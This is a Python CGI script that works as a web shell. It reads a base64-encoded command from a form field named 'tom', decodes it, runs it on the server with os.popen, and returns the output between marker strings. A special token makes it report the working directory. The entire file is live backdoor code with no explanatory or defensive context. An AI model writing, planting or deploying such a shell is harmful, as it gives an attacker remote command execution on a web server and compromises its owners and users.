#!C:/Python27/python.exe
# -*- coding: utf-8 -*-
# enable debugging

pwd='tom';

import base64
import os
import cgi
import subprocess

form = cgi.FieldStorage()
if form.has_key(pwd) and form[pwd].value != "":
    cmdLine = form[pwd].value
    print ''

if cmdLine=='Szh0ZWFt':
	print '[S]' + os.path.abspath('.') + '[E]'
else:
	print '->|' + os.popen(base64.b64decode(cmdLine)).read() + '|<-'